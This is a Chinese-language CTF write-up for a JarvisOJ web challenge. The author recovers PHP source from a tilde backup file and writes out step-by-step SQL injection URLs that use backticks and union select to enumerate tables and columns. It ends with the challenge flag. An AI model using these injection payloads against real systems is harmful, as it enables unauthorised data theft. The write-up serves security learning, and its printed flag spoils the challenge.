## 描述

题目入口：http://web.jarvisoj.com:32794/

Hint1: 先找到源码再说吧~~

## 题解

response 就这点东西

```
flag{xxx}
```

尝试 `flag.txt, robots.txt, index.html, index.php`，发现 `index.php` 得到了相同的结果。因此一定是 PHP 渲染 `index.php` 得到的结果，可能我们就是要找出这个源码。

查看 headers 发现了 Response 有 `Set-Cookie: PHPSESSID=agf3ue9ih4upenoj6shb6lmuo4; path=/`，是不是要从 Cookie 切入？

我想是不是还有其他文件，用御剑扫了一下，得到了

```
http://web.jarvisoj.com:32794/phpmyadmin/
http://web.jarvisoj.com:32794/config.php
http://web.jarvisoj.com:32794/index.php
http://web.jarvisoj.com:32794/phpmyadmin/db_create.php
```

哈哈，一个个试。好吧，一个都没有用。。查题解。

woc？？？？在后面加一个波浪号？？？这是什么蛇皮备份方式。

于是访问 http://web.jarvisoj.com:32794/index.php~ 得到

```php
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>
```

阅读了一些下，应该又是注入。先查一下 `mysqli_query` 的用法，没啥大发现。还是老老实实构造注入吧。

首先试了下 `table=flag` 没有返回 `Hello Hacker`，故 `secret_flag` 是一个表名。

经过我一段时间的尝试，我一点突破都没有。。。我太菜了。。还是看题解吧。

分析 ```desc `secret_{$table}` ``` 和 ```select 'flag{xxx}' from secret_{$table}```

`desc` 是 describe 命令，返回表信息的，见 https://www.jb51.net/article/93379.htm

只需在 `table` 里多加两个 ``` ` ``` 便可以实现注入，一些注入教程 https://blog.csdn.net/cnbird2008/article/details/6217839

先尝试注入是否成功

```
http://web.jarvisoj.com:32794/index.php?table=test` `union select 1
```

可是返回值还是 `flag{xxx}`。这是由于 PHP 代码里有 `echo $ret[0];`，所以我们要 `limit` 一下。

```
http://web.jarvisoj.com:32794/index.php?table=test` `union select 1 limit 1,1
```

成功得到 `1` 的返回值，那么开始我们的表演吧。

```
http://web.jarvisoj.com:32794/index.php?table=test` `union select database() limit 1,1
```

得到数据库名 `61d300`，再

```
http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1
```

得到所有表名 `secret_flag,secret_test`，再

```
http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1
```

得到列名 `flagUwillNeverKnow`，最后再获取内容即可

```
http://web.jarvisoj.com:32794/index.php?table=test` `union select flagUwillNeverKnow from secret_flag limit 1,1
```

## 答案

flag{luckyGame~}
